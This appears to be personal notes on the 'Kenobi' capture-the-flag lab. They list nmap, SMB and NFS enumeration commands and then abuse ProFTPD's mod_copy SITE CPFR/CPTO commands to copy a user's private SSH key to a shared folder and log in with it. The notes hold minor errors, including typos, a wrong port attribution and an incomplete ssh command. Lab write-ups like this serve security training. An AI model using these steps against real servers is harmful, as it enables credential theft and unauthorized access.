# KENOBI

## enumeration

~~~
nmap -sV -sS -sC -oN namp_initial.txt <ip>
~~

- port 139 / 445 open.

~~~
enum4linux -a <ip>
~~~

- anonymous share

~~~
smbclient \\\\<ip>\\anonymous
~~~

- log.txt file exists showing a proFTPD server and SSH key being generated for kenobi.

- enumerate the proFTPD server (on port 111 from first nmap scan).

- A rpcbind is on port 111 
(A server that converts remote procedure call (RPC) program number into universal addresses. 
When an RPC service is started, it tells rpcbind the address at which it is listening 
and the RPC program number its prepared to serve). 

~~~
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip>
~~~

## Gain access through with ProFTPD

- Get the version of ProFTPD
- Connect via netcat

~~~
nc <ip address> <port>
~~~

- Use exploit in mod_copy module to copy private ssh key to tmp directory

~~~
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
~~~

- Use nft to mount to /var/tmp

~~~
mkdir /mnt/kenobiNFS
mount <ip of target mount>:/var /mnt/kenobiNFS/
~~~ 


- Then ssh into kenobi account

~~~
chmod 600 id_rsa
ssh -i kenobi@<ip address>
~~~

